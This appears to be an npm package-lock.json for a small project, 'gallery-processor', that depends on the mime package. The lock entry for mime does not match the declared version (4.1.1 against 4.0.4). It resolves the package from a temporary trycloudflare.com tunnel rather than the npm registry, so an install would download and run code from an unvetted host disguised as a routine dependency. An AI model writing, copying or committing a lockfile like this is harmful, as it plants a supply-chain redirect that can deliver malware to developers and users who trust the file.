{
  "name": "gallery-processor",
  "version": "0.5.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "gallery-processor",
      "version": "0.5.0",
      "license": "MIT",
      "dependencies": {
        "mime": "4.0.4"
      }
    },
    "node_modules/mime": {
      "version": "4.1.1",
      "resolved": "https://phrases-ash-messenger-britain.trycloudflare.com/npm/mime/-/mime-4.1.1.tgz",
      "integrity": "sha512-4AfXz+2vUXXoRVZfAKYGl3ed74G+9IAEVj1Zmtq3wHdLJMR9QO/TZ4yv0WtTvLZvGRaTQ+XeRDwGe+ZLNbrjEw==",
      "funding": [
        "https://github.com/sponsors/broofa"
      ],
      "license": "MIT",
      "bin": {
        "mime": "bin/cli.js"
      },
      "engines": {
        "node": ">=16"
      }
    }
  }
}